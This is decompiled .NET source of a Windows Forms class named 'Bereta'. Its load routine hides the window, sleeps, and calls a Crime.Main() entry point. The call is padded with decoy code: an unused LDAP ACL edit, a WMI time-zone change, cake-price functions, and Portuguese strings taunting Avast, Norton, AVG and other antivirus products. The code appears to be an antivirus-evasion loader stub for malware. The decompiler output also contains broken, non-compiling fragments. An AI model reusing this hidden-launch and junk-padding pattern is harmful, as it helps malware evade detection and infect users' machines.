		// (set) Token: 0x060001B6 RID: 438 RVA: 0x0000A6CC File Offset: 0x000088CC
		internal virtual MaskedTextBox MaskedTextBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DD RID: 221
		// (get) Token: 0x060001B7 RID: 439 RVA: 0x0000A6D5 File Offset: 0x000088D5
		// (set) Token: 0x060001B8 RID: 440 RVA: 0x0000A6DD File Offset: 0x000088DD
		internal virtual ListView ListView10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DE RID: 222
		// (get) Token: 0x060001B9 RID: 441 RVA: 0x0000A6E6 File Offset: 0x000088E6
		// (set) Token: 0x060001BA RID: 442 RVA: 0x0000A6EE File Offset: 0x000088EE
		internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DF RID: 223
		// (get) Token: 0x060001BB RID: 443 RVA: 0x0000A6F7 File Offset: 0x000088F7
		// (set) Token: 0x060001BC RID: 444 RVA: 0x0000A6FF File Offset: 0x000088FF
		internal virtual ComboBox ComboBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E0 RID: 224
		// (get) Token: 0x060001BD RID: 445 RVA: 0x0000A708 File Offset: 0x00008908
		// (set) Token: 0x060001BE RID: 446 RVA: 0x0000A710 File Offset: 0x00008910
		internal virtual DateTimePicker DateTimePicker10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E1 RID: 225
		// (get) Token: 0x060001BF RID: 447 RVA: 0x0000A719 File Offset: 0x00008919
		// (set) Token: 0x060001C0 RID: 448 RVA: 0x0000A721 File Offset: 0x00008921
		internal virtual CheckedListBox CheckedListBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E2 RID: 226
		// (get) Token: 0x060001C1 RID: 449 RVA: 0x0000A72A File Offset: 0x0000892A
		// (set) Token: 0x060001C2 RID: 450 RVA: 0x0000A732 File Offset: 0x00008932
		internal virtual Button Button10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E3 RID: 227
		// (get) Token: 0x060001C3 RID: 451 RVA: 0x0000A73B File Offset: 0x0000893B
		// (set) Token: 0x060001C4 RID: 452 RVA: 0x0000A743 File Offset: 0x00008943
		internal virtual CheckedListBox CheckedListBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E4 RID: 228
		// (get) Token: 0x060001C5 RID: 453 RVA: 0x0000A74C File Offset: 0x0000894C
		// (set) Token: 0x060001C6 RID: 454 RVA: 0x0000A754 File Offset: 0x00008954
		internal virtual ComboBox ComboBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E5 RID: 229
		// (get) Token: 0x060001C7 RID: 455 RVA: 0x0000A75D File Offset: 0x0000895D
		// (set) Token: 0x060001C8 RID: 456 RVA: 0x0000A765 File Offset: 0x00008965
		internal virtual ListBox ListBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E6 RID: 230
		// (get) Token: 0x060001C9 RID: 457 RVA: 0x0000A76E File Offset: 0x0000896E
		// (set) Token: 0x060001CA RID: 458 RVA: 0x0000A776 File Offset: 0x00008976
		internal virtual LinkLabel LinkLabel11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E7 RID: 231
		// (get) Token: 0x060001CB RID: 459 RVA: 0x0000A77F File Offset: 0x0000897F
		// (set) Token: 0x060001CC RID: 460 RVA: 0x0000A787 File Offset: 0x00008987
		internal virtual MaskedTextBox MaskedTextBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E8 RID: 232
		// (get) Token: 0x060001CD RID: 461 RVA: 0x0000A790 File Offset: 0x00008990
		// (set) Token: 0x060001CE RID: 462 RVA: 0x0000A798 File Offset: 0x00008998
		internal virtual ProgressBar ProgressBar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E9 RID: 233
		// (get) Token: 0x060001CF RID: 463 RVA: 0x0000A7A1 File Offset: 0x000089A1
		// (set) Token: 0x060001D0 RID: 464 RVA: 0x0000A7A9 File Offset: 0x000089A9
		internal virtual PictureBox PictureBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000EA RID: 234
		// (get) Token: 0x060001D1 RID: 465 RVA: 0x0000A7B2 File Offset: 0x000089B2
		// (set) Token: 0x060001D2 RID: 466 RVA: 0x0000A7BA File Offset: 0x000089BA
		internal virtual PictureBox PictureBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000EB RID: 235
		// (get) Token: 0x060001D3 RID: 467 RVA: 0x0000A7C3 File Offset: 0x000089C3
		// (set) Token: 0x060001D4 RID: 468 RVA: 0x0000A7CB File Offset: 0x000089CB
		internal virtual WebBrowser WebBrowser11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000EC RID: 236
		// (get) Token: 0x060001D5 RID: 469 RVA: 0x0000A7D4 File Offset: 0x000089D4
		// (set) Token: 0x060001D6 RID: 470 RVA: 0x0000A7DC File Offset: 0x000089DC
		internal virtual TextBox TextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000ED RID: 237
		// (get) Token: 0x060001D7 RID: 471 RVA: 0x0000A7E5 File Offset: 0x000089E5
		// (set) Token: 0x060001D8 RID: 472 RVA: 0x0000A7ED File Offset: 0x000089ED
		internal virtual RichTextBox RichTextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000EE RID: 238
		// (get) Token: 0x060001D9 RID: 473 RVA: 0x0000A7F6 File Offset: 0x000089F6
		// (set) Token: 0x060001DA RID: 474 RVA: 0x0000A7FE File Offset: 0x000089FE
		internal virtual RadioButton RadioButton8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000EF RID: 239
		// (get) Token: 0x060001DB RID: 475 RVA: 0x0000A807 File Offset: 0x00008A07
		// (set) Token: 0x060001DC RID: 476 RVA: 0x0000A80F File Offset: 0x00008A0F
		internal virtual NumericUpDown NumericUpDown11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F0 RID: 240
		// (get) Token: 0x060001DD RID: 477 RVA: 0x0000A818 File Offset: 0x00008A18
		// (set) Token: 0x060001DE RID: 478 RVA: 0x0000A820 File Offset: 0x00008A20
		internal virtual MonthCalendar MonthCalendar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F1 RID: 241
		// (get) Token: 0x060001DF RID: 479 RVA: 0x0000A829 File Offset: 0x00008A29
		// (set) Token: 0x060001E0 RID: 480 RVA: 0x0000A831 File Offset: 0x00008A31
		internal virtual MaskedTextBox MaskedTextBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F2 RID: 242
		// (get) Token: 0x060001E1 RID: 481 RVA: 0x0000A83A File Offset: 0x00008A3A
		// (set) Token: 0x060001E2 RID: 482 RVA: 0x0000A842 File Offset: 0x00008A42
		internal virtual ListView ListView11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F3 RID: 243
		// (get) Token: 0x060001E3 RID: 483 RVA: 0x0000A84B File Offset: 0x00008A4B
		// (set) Token: 0x060001E4 RID: 484 RVA: 0x0000A853 File Offset: 0x00008A53
		internal virtual Label Label11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F4 RID: 244
		// (get) Token: 0x060001E5 RID: 485 RVA: 0x0000A85C File Offset: 0x00008A5C
		// (set) Token: 0x060001E6 RID: 486 RVA: 0x0000A864 File Offset: 0x00008A64
		internal virtual ComboBox ComboBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F5 RID: 245
		// (get) Token: 0x060001E7 RID: 487 RVA: 0x0000A86D File Offset: 0x00008A6D
		// (set) Token: 0x060001E8 RID: 488 RVA: 0x0000A875 File Offset: 0x00008A75
		internal virtual DateTimePicker DateTimePicker11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F6 RID: 246
		// (get) Token: 0x060001E9 RID: 489 RVA: 0x0000A87E File Offset: 0x00008A7E
		// (set) Token: 0x060001EA RID: 490 RVA: 0x0000A886 File Offset: 0x00008A86
		internal virtual CheckedListBox CheckedListBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F7 RID: 247
		// (get) Token: 0x060001EB RID: 491 RVA: 0x0000A88F File Offset: 0x00008A8F
		// (set) Token: 0x060001EC RID: 492 RVA: 0x0000A897 File Offset: 0x00008A97
		internal virtual CheckBox CheckBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F8 RID: 248
		// (get) Token: 0x060001ED RID: 493 RVA: 0x0000A8A0 File Offset: 0x00008AA0
		// (set) Token: 0x060001EE RID: 494 RVA: 0x0000A8A8 File Offset: 0x00008AA8
		internal virtual Button Button11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F9 RID: 249
		// (get) Token: 0x060001EF RID: 495 RVA: 0x0000A8B1 File Offset: 0x00008AB1
		// (set) Token: 0x060001F0 RID: 496 RVA: 0x0000A8B9 File Offset: 0x00008AB9
		internal virtual CheckedListBox CheckedListBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FA RID: 250
		// (get) Token: 0x060001F1 RID: 497 RVA: 0x0000A8C2 File Offset: 0x00008AC2
		// (set) Token: 0x060001F2 RID: 498 RVA: 0x0000A8CA File Offset: 0x00008ACA
		internal virtual ComboBox ComboBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FB RID: 251
		// (get) Token: 0x060001F3 RID: 499 RVA: 0x0000A8D3 File Offset: 0x00008AD3
		// (set) Token: 0x060001F4 RID: 500 RVA: 0x0000A8DB File Offset: 0x00008ADB
		internal virtual ListBox ListBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FC RID: 252
		// (get) Token: 0x060001F5 RID: 501 RVA: 0x0000A8E4 File Offset: 0x00008AE4
		// (set) Token: 0x060001F6 RID: 502 RVA: 0x0000A8EC File Offset: 0x00008AEC
		internal virtual LinkLabel LinkLabel12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FD RID: 253
		// (get) Token: 0x060001F7 RID: 503 RVA: 0x0000A8F5 File Offset: 0x00008AF5
		// (set) Token: 0x060001F8 RID: 504 RVA: 0x0000A8FD File Offset: 0x00008AFD
		internal virtual MaskedTextBox MaskedTextBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FE RID: 254
		// (get) Token: 0x060001F9 RID: 505 RVA: 0x0000A906 File Offset: 0x00008B06
		// (set) Token: 0x060001FA RID: 506 RVA: 0x0000A90E File Offset: 0x00008B0E
		internal virtual ProgressBar ProgressBar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FF RID: 255
		// (get) Token: 0x060001FB RID: 507 RVA: 0x0000A917 File Offset: 0x00008B17
		// (set) Token: 0x060001FC RID: 508 RVA: 0x0000A91F File Offset: 0x00008B1F
		internal virtual PictureBox PictureBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000100 RID: 256
		// (get) Token: 0x060001FD RID: 509 RVA: 0x0000A928 File Offset: 0x00008B28
		// (set) Token: 0x060001FE RID: 510 RVA: 0x0000A930 File Offset: 0x00008B30
		internal virtual PictureBox PictureBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000101 RID: 257
		// (get) Token: 0x060001FF RID: 511 RVA: 0x0000A939 File Offset: 0x00008B39
		// (set) Token: 0x06000200 RID: 512 RVA: 0x0000A941 File Offset: 0x00008B41
		internal virtual WebBrowser WebBrowser12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000102 RID: 258
		// (get) Token: 0x06000201 RID: 513 RVA: 0x0000A94A File Offset: 0x00008B4A
		// (set) Token: 0x06000202 RID: 514 RVA: 0x0000A952 File Offset: 0x00008B52
		internal virtual TextBox TextBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000103 RID: 259
		// (get) Token: 0x06000203 RID: 515 RVA: 0x0000A95B File Offset: 0x00008B5B
		// (set) Token: 0x06000204 RID: 516 RVA: 0x0000A963 File Offset: 0x00008B63
		internal virtual RichTextBox RichTextBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000104 RID: 260
		// (get) Token: 0x06000205 RID: 517 RVA: 0x0000A96C File Offset: 0x00008B6C
		// (set) Token: 0x06000206 RID: 518 RVA: 0x0000A974 File Offset: 0x00008B74
		internal virtual RadioButton RadioButton9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000105 RID: 261
		// (get) Token: 0x06000207 RID: 519 RVA: 0x0000A97D File Offset: 0x00008B7D
		// (set) Token: 0x06000208 RID: 520 RVA: 0x0000A985 File Offset: 0x00008B85
		internal virtual NumericUpDown NumericUpDown12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000106 RID: 262
		// (get) Token: 0x06000209 RID: 521 RVA: 0x0000A98E File Offset: 0x00008B8E
		// (set) Token: 0x0600020A RID: 522 RVA: 0x0000A996 File Offset: 0x00008B96
		internal virtual MonthCalendar MonthCalendar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000107 RID: 263
		// (get) Token: 0x0600020B RID: 523 RVA: 0x0000A99F File Offset: 0x00008B9F
		// (set) Token: 0x0600020C RID: 524 RVA: 0x0000A9A7 File Offset: 0x00008BA7
		internal virtual MaskedTextBox MaskedTextBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000108 RID: 264
		// (get) Token: 0x0600020D RID: 525 RVA: 0x0000A9B0 File Offset: 0x00008BB0
		// (set) Token: 0x0600020E RID: 526 RVA: 0x0000A9B8 File Offset: 0x00008BB8
		internal virtual ListView ListView12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000109 RID: 265
		// (get) Token: 0x0600020F RID: 527 RVA: 0x0000A9C1 File Offset: 0x00008BC1
		// (set) Token: 0x06000210 RID: 528 RVA: 0x0000A9C9 File Offset: 0x00008BC9
		internal virtual Label Label12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010A RID: 266
		// (get) Token: 0x06000211 RID: 529 RVA: 0x0000A9D2 File Offset: 0x00008BD2
		// (set) Token: 0x06000212 RID: 530 RVA: 0x0000A9DA File Offset: 0x00008BDA
		internal virtual ComboBox ComboBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010B RID: 267
		// (get) Token: 0x06000213 RID: 531 RVA: 0x0000A9E3 File Offset: 0x00008BE3
		// (set) Token: 0x06000214 RID: 532 RVA: 0x0000A9EB File Offset: 0x00008BEB
		internal virtual DateTimePicker DateTimePicker12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010C RID: 268
		// (get) Token: 0x06000215 RID: 533 RVA: 0x0000A9F4 File Offset: 0x00008BF4
		// (set) Token: 0x06000216 RID: 534 RVA: 0x0000A9FC File Offset: 0x00008BFC
		internal virtual CheckedListBox CheckedListBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010D RID: 269
		// (get) Token: 0x06000217 RID: 535 RVA: 0x0000AA05 File Offset: 0x00008C05
		// (set) Token: 0x06000218 RID: 536 RVA: 0x0000AA0D File Offset: 0x00008C0D
		internal virtual CheckBox CheckBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010E RID: 270
		// (get) Token: 0x06000219 RID: 537 RVA: 0x0000AA16 File Offset: 0x00008C16
		// (set) Token: 0x0600021A RID: 538 RVA: 0x0000AA1E File Offset: 0x00008C1E
		internal virtual Button Button12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x0600021B RID: 539 RVA: 0x0000AA28 File Offset: 0x00008C28
		private void Bereta_Load(object sender, EventArgs e)
		{
			int num4;
			int num6;
			object obj4;
			try
			{
				IL_00:
				int num = 1;
				base.Hide();
				IL_09:
				num = 2;
				base.Visible = false;
				IL_13:
				num = 3;
				Thread.Sleep(2000);
				IL_20:
				num = 4;
				int num2 = 0;
				IL_26:
				num = 5;
				if (num2 == 1)
				{
					goto IL_46C;
				}
				IL_31:
				num = 7;
				if (num2 == 2)
				{
					goto IL_46C;
				}
				IL_3C:
				num = 9;
				if (num2 != 3)
				{
					goto IL_248;
				}
				IL_48:
				num = 10;
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("LDAP://CN=Rob Young, OU=Finance, DC=fabrikam,DC=Com", null));
				IL_5E:
				num = 11;
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Get", new object[]
				{
					"ntSecurityDescriptor"
				}, null, null, null));
				IL_87:
				num = 12;
				object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, null, "DiscretionaryACL", new object[0], null, null, null));
				IL_A8:
				num = 13;
				object objectValue4 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("AccessControlEntry", ""));
				IL_C2:
				num = 14;
				NewLateBinding.LateSet(objectValue4, null, "Trustee", new object[]
				{
					"FABRIKAM\\kmyer"
				}, null, null);
				IL_E3:
				num = 15;
				NewLateBinding.LateSet(objectValue4, null, "AceFlags", new object[]
				{
					0
				}, null, null);
				IL_105:
				num = 16;
				NewLateBinding.LateSet(objectValue4, null, "AceType", new object[]
				{
					5
				}, null, null);
				IL_127:
				num = 17;
				NewLateBinding.LateSet(objectValue4, null, "Flags", new object[]
				{
					3
				}, null, null);
				IL_149:
				num = 18;
				NewLateBinding.LateSet(objectValue4, null, "ObjectType", new object[]
				{
					"{68b1d179-0d15-4d4f-ab71-46152e79a7bc}"
				}, null, null);
				IL_16A:
				num = 19;
				NewLateBinding.LateSet(objectValue4, null, "AccessMask", new object[]
				{
					256
				}, null, null);
				IL_190:
				num = 20;
				object[] array;
				bool[] array2;
				object obj = NewLateBinding.LateGet(objectValue3, null, "AddAce", array = new object[]
				{
					objectValue4
				}, null, null, array2 = new bool[]
				{
					true
				});
				if (array2[0])
				{
					objectValue4 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				RuntimeHelpers.GetObjectValue(obj);
				IL_1D5:
				num = 21;
				NewLateBinding.LateSet(objectValue2, null, "DiscretionaryAcl", new object[]
				{
					objectValue3
				}, null, null);
				IL_1F3:
				num = 22;
				NewLateBinding.LateCall(objectValue, null, "Put", new object[]
				{
					"ntSecurityDescriptor",
					this.Array(RuntimeHelpers.GetObjectValue(objectValue2))
				}, null, null, null, true);
				IL_227:
				num = 23;
				NewLateBinding.LateCall(objectValue, null, "dimInfo", new object[0], null, null, null, true);
				goto IL_46C;
				IL_248:
				num = 25;
				if (num2 != 0)
				{
					goto IL_330;
				}
				IL_253:
				num = 26;
				int num3 = 1;
				checked
				{
					do
					{
						IL_25A:
						num = 27;
						string text = Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num3), 1, -1, CompareMethod.Binary);
						IL_279:
						num = 28;
						text.Replace("a", "Aqui nem Gabriel Pato Pega");
						IL_28F:
						num = 29;
						text.Replace("a", "O Avast Fica Maluco");
						IL_2A5:
						num = 30;
						text.Replace("a", "O Avira nao arruma nada");
						IL_2BB:
						num = 31;
						text.Replace("a", "BitDefender Pede pra sair");
						IL_2D1:
						num = 32;
						text.Replace("a", "Norton saiu chorando");
						IL_2E7:
						num = 33;
						text.Replace("a", "AVG pediu pra sair e tomo tapa na cara");
						IL_2FD:
						num = 34;
						if (text.Contains("sera que esse antivirus vai pedir arrego?"))
						{
							break;
						}
						IL_30F:
						num = 36;
						num3++;
					}
					while (num3 <= 30);
					IL_322:
					num = 37;
					Crime.Main();
					goto IL_46C;
					IL_330:
					num = 39;
					if (num2 != 4)
					{
						goto IL_46C;
					}
					IL_33C:
					ProjectData.ClearProjectError();
					num4 = 1;
					IL_343:
					num = 41;
					object right = ".";
					IL_34D:
					num = 42;
					object obj2 = -480;
					IL_35C:
					num = 43;
					object objectValue5 = RuntimeHelpers.GetObjectValue(Interaction.GetObject(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("winmgmts:{impersonationLevel=impersonate}!\\\\", right), "\\root\\cimv2")), null));
					IL_387:
					num = 44;
					object objectValue6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue5, null, "ExecQuery", new object[]
					{
						"Select * from Win32_ComputerSystem"
					}, null, null, null));
					IL_3B0:
					num = 45;
					IEnumerator enumerator = ((IEnumerable)objectValue6).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object obj3 = enumerator.Current;
						object objectValue7 = RuntimeHelpers.GetObjectValue(obj3);
						IL_3D5:
						num = 46;
						NewLateBinding.LateSet(objectValue7, null, "CurrentTimeZone", new object[]
						{
							obj2
						}, null, null);
						IL_3F2:
						num = 47;
						NewLateBinding.LateCall(objectValue7, null, "Put_", new object[0], null, null, null, true);
						IL_40E:
						num = 48;
						Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue7, null, "Err", new object[0], null, null, null), 0, false);
						IL_435:
						num = 50;
						Information.Err().Clear();
						IL_443:
						num = 51;
					}
					IL_453:
					num = 52;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					IL_46C:
					goto IL_593;
					IL_471:;
				}
				int num5 = num6 + 1;
				num6 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num5);
				IL_553:
				goto IL_588;
				IL_555:
				num6 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
				IL_566:;
			}
			catch when (endfilter(obj4 is Exception & num4 != 0 & num6 == 0))
			{
				Exception ex = (Exception)obj5;
				goto IL_555;
			}
			IL_588:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_593:
			if (num6 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600021C RID: 540 RVA: 0x0000AFEC File Offset: 0x000091EC
		private object Array(object objSD)
		{
			throw new NotImplementedException();
		}

		// Token: 0x0600021D RID: 541 RVA: 0x0000B000 File Offset: 0x00009200
		public double GetCakePrice(double price)
		{
			price += 2.0;
			price += 2.5;
			price += 3.0;
			return price;
		}

		// Token: 0x0600021E RID: 542 RVA: 0x0000B038 File Offset: 0x00009238
		public double GetDrinkPrice(double dprice)
		{
			dprice += 1.8;
			dprice += 2.0;
			return dprice;
		}

		// Token: 0x0400000B RID: 11
		private IContainer components;

		// Token: 0x0400010D RID: 269
		private double price;

		// Token: 0x0400010E RID: 270
		private double dprice;

		// Token: 0x0400010F RID: 271
		private double total;
	}
}
